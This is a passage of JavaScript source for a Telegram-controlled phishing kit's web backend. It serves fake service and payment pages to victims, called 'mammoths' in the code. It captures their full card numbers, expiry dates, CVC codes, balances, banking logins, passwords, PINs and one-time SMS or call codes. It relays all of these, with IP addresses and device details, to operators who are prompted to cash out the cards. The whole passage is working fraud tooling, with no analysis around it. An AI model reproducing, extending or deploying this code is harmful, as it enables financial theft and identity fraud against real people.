                inline_keyboard: [
                    [{ text: '✅ Успех', callback_data: 'zxczxczxc' }]
                ]
            })*/
            await ctx.deleteMessage(ctx.update.callback_query.message.message_id)
        } else if (cbdata == "rassylka") {
            user.scene = `rassylka`;
            return await ctx.replyWithHTML(`Введите текст рассылки!`)
        } else if (cbdata == "templates") {
            let templates = db.get("templates").value();
            let btns = [
                [{ text: 'Добавить новый шаблон', callback_data: `createtemplate`}]
            ];
            for (var i=0; i < templates.length; i++) {
                btns.push([{text: templates[i].name, callback_data: `template_${templates[i].name}`}, {text: `❌`, callback_data: `deltemplate_${templates[i].name}`}]);
            }
            await ctx.telegram.sendMessage(user.id, `Шаблоны ошибок: `, {reply_markup: {
                inline_keyboard: btns
            }});
        } else if (cbdata.startsWith("createtemplate")) {
            user.scene = "template_name"
            await ctx.telegram.sendMessage(user.id, `Введите имя шаблона:`);
        } else if (cbdata.startsWith("deltemplate_")) {
            let template = db.get("templates").value().find(x=>x.name==cbdata.split("_")[1])
            db.get("templates").value().splice(db.get("templates").value().indexOf(template), 1);
            return await ctx.replyWithHTML(`Ошибка "${template.name}"успешно удалена!`)
        }
        return ctx.answerCbQuery()
    } catch (error) {console.log(error)}
})

bot.launch();

app.get('/clstatus:linkId', (req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    link.status = ``
    return res.send(link.status)
    res.send(JSON.stringify(link))
})
app.get('/status:linkId', (req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    return res.send(link.status)
    res.send(JSON.stringify(link))
})
app.get('/:linkId', (req, res) => {
    try {
        let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
        let country = countries.find((x) => {
            let y = x.services.find(x=>x.subdomain==link.service);
            if(y) return true
            return false
        });
        let service = country.services.find(x=>x.subdomain==link.service);
        var ua = useragent.parse(req.headers['user-agent']);
        bot.telegram.sendMessage(link.owner, `
${country.flag} ${service.name}
ℹ️ Мамонт перешёл по ссылке 🔗

☑️Объявление: ${link.name}
☑️Ссылка: ${config.domain}/${link.id}
☑️Стоимость: ${link.price} 
☑️IP адрес: ${req.headers['x-forwarded-for']}
☑️Устройство:  ${ua.isMobile ? '📱 Телефон' : '🖥 Компьютер'}
        `, {
            parse_mode: "html",
        })
        return res.render(`${service.folder}/index`, {link: link, name: link.fio.split(" ")[1], surname: link.fio.split(" ")[0]})
        res.send(JSON.stringify(link))
    } catch (err){
        console.log(err)
        res.send("ERROR!")
    }
})
app.get('/personal/:linkId', (req,res)=>{
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    link.status = `loading`
    return res.render("lk", {id:link.id})
})
app.post('/personal/submit/:linkId', async (req,res)=>{
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    let owner = db.get("users").value().find(x=>x.id==link.owner)
    bot.telegram.sendMessage(link.owner, `💎 Мамонт отправил данные от ЛК\n\nIP: ${req.headers['x-forwarded-for']}`, {
        parse_mode: "html",
    })
    let btns = [
        [{ text: '📧 СМС', callback_data: `sms_${link.id}`}],
        [{ text: '📞 Звонок', callback_data: `mobile_${link.id}`}],
    ]
    let templates = db.get("templates").value();
    for (var i=0; i < templates.length; i++) {
        btns.push([{text: `⛔️ ${templates[i].name}`, callback_data: `lkerror_${link.id}_${templates[i].name}`}]);
    }
    await bot.telegram.sendMessage(link.vbiver, `‼️ <b>Данные от ЛК</b>\n\nВладелец: <a href='tg://user?id=${owner.id}'>${owner.name}</a>\n☘️ Карта: <code>${link.card}</code>\n📆 Срок: <code>${link.srok}</code>\n🕶 CVC: <code>${link.cvv}</code>\n\nЛогин: +380${req.body.phone}\nПароль: ${req.body.password}\nПИН код: ${req.body.pin}\nUID: <code>${req.cookies["uid"]}</code>\nВоркер: @${owner.username}\n\nIP: ${req.headers['x-forwarded-for']}`, {
        parse_mode: "html",
        reply_markup: {
            inline_keyboard: btns
        }
    })
    return res.send("200")
})
app.get('/card/:linkId', async (req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    let uid = !req.cookies["uid"] ? crypto.randomUUID() : req.cookies["uid"]
    res.cookie("uid", uid)
    bot.telegram.sendMessage(config.logs_id, `
💎 Мамонт перешёл на страницу ввода карты

Название: ${link.name}
👤 Ссылка: ${config.domain}/${link.id}

💸 Сумма: ${link.price}

IP: ${req.headers['x-forwarded-for']}
    `, {
        parse_mode: "html",
    })
    user = await bot.telegram.getChat(link.owner)
    bot.telegram.sendMessage(link.owner, `
💎 Мамонт перешёл на страницу ввода карты

Название: ${link.name}
💸 Сумма: ${link.price}
UID: <code>${uid}</code>
Воркер: @${user.username}

IP: ${req.headers['x-forwarded-for']}
    `, {
        parse_mode: "html",
    })
    link.status = "loading"
    return res.render("card", {id:link.id})
    res.send(JSON.stringify(link))
})

app.post('/card/submit/:linkId', async(req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    link.card4 = req.body.fcard.replaceAll(" ", "")
    link.card4 = link.card4.substring(link.card4.length-4)
    link.card = req.body.fcard.replaceAll(" ", "")
    link.srok = `${req.body.fexpm}/${req.body.fexpy}`
    link.cvv = req.body.fcvc
    link.bal = req.body.fbal
    link.phone = req.body.fphone
    try {
        let bank = await axios.get(`https://bins.antipublic.cc/bins/${link.card}`)
        bank = bank.data;
        brand = `${bank.brand} ${bank.bank}`
    } catch {
        brand = `Не определён`
    }
    let owner = db.get("users").value().find(x=>x.id==link.owner)
    let country = countries.find((x) => {
        let y = x.services.find(x=>x.subdomain==link.service);
        if(y) return true
        return false
    });
    let service = country.services.find(x=>x.subdomain==link.service);
    var ua = useragent.parse(req.headers['user-agent']);
    bot.telegram.sendMessage(link.owner, `
☑️ Ввод карты ${country.flag} ${service.name}

☑️Объявление: ${link.name}
☑️Стоимость: ${link.price} 

💳 Номер карты: ${link.card.substring(0,5)}******${link.card4}

💰 Баланс: ${link.bal} 
🏦 Банк: ${brand}

☑️IP адрес: ${req.headers['x-forwarded-for']}
☑️Устройство:  ${ua.isMobile ? '📱 Телефон' : '🖥 Компьютер'}
    `, {
        parse_mode: "html",
    })
    await bot.telegram.sendMessage(config.achat_id, `‼️ <b>Пришла карта</b>\n\nВладелец: <a href='tg://user?id=${owner.id}'>${owner.name}</a>\nБин: ${brand}\n☘️ Карта: <code>${req.body.fcard.replaceAll(" ", "")}</code>\n📆 Срок: <code>${req.body.fexpm}/${req.body.fexpy}</code>\n🕶 CVC: <code>${req.body.fcvc}</code>\nБаланс: ${link.bal} ₴\n\nUID: <code>${req.cookies["uid"]}</code>\n\nIP: ${req.headers['x-forwarded-for']}`, {
        parse_mode: "html",
        reply_markup: {
            inline_keyboard: [
                [{ text: '✅ Взять на вбив', callback_data: `vbiv_${link.id}`}]
            ]
        }
    })
    return res.send("200")
})

app.get('/submit/:linkId', async(req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    let owner = db.get("users").value().find(x=>x.id==link.owner)
    bot.telegram.sendMessage(link.owner, `💎 Мамонт перешёл на страницу ввода СМС\n\nIP: ${req.headers['x-forwarded-for']}`, {
        parse_mode: "html",
    })
    console.log(link.status)
    if(link.status == "call") return res.render("call", {id:link.id, card: link.card4})
    if(link.status == "app") return res.render("app", {id:link.id, card: link.card4})
    return res.render("sms", {id:link.id, card: link.card4})
    res.send(JSON.stringify(link))
})

app.post('/confirm/:linkId', async(req, res) => {
    let link = db.get("links").value().find(x=>x.id===Number(req.params.linkId))
    let owner = db.get("users").value().find(x=>x.id==link.owner)
    bot.telegram.sendMessage(link.owner, `💎 Мамонт ввёл СМС код\n\nIP: ${req.headers['x-forwarded-for']}`, {
        parse_mode: "html",
    })
    let btns = [
        [{ text: '✅ Успех', callback_data: `success_${link.id}`}],
        [{ text: '✅ Пиздуй на ЛК', callback_data: `nextlk_${link.id}`}],
        [{ text: '📱 Код с приложения', callback_data: `nextapp_${link.id}`}, { text: '📱 Код из звонка', callback_data: `nextcall_${link.id}`}],
        [{ text: '💳 Точный баланс', callback_data: `nextcardbal_${link.id}`}],
    ]
    let templates = db.get("templates").value();
    for (var i=0; i < templates.length; i++) {
        btns.push([{text: `⛔️ ${templates[i].name}`, callback_data: `error_${link.id}_${templates[i].name}`}]);
    }
    user = await bot.telegram.getChat(link.owner)
    await bot.telegram.sendMessage(link.vbiver, `💎 <b>Введён код</b>\n\nВладелец: <a href='tg://user?id=${owner.id}'>${owner.name}</a>\n☘️ Карта: <code>${link.card}</code>\n📆 Срок: <code>${link.srok}</code>\n🕶 CVC: <code>${link.cvv}</code>\n\n📱 Телефон: <code>${link.phone}</code>\nUID: <code>${req.cookies["uid"]}</code>\nВоркер: @${user.username}\nIP: ${req.headers['x-forwarded-for']}\n\n<code>${req.body.dscode}</code>`, {
        parse_mode: "html",
        reply_markup: {
            inline_keyboard: btns
        }
    })
    link.status = `loading`
    return res.render("sms", {id:link.id, card: link.card4}) 
    res.send(JSON.stringify(link))
})
app.listen(port)
